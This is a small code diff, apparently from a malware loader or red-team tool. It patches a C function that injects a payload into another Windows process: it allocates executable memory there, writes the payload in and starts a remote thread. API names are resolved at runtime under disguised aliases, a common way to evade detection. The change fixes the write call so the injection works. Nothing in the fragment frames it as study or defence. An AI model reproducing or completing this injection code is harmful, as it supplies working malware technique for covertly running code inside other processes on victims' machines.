@@ -81,7 +81,7 @@ int Inject(HANDLE hProc, unsigned char * payload, unsigned int lengthyBoi){
 	pwProcmem = GetProcAddress(GetModuleHandle("kernel32.dll"), wProcmem);
 
 	pRemoteCode = pAllocex(hProc, NULL, lengthyBoi, MEM_COMMIT, PAGE_EXECUTE_READ);
-	wProcmem(hProc, pRemoteCode, (PVOID)payload, (SIZE_T)lengthyBoi, (SIZE_T *)NULL);
+	pwProcmem(hProc, pRemoteCode, (PVOID)payload, (SIZE_T)lengthyBoi, (SIZE_T *)NULL);
 
 	hThread = prthreadA(hProc, NULL, 0, pRemoteCode, NULL, 0, NULL);
 	if(hThread != NULL){
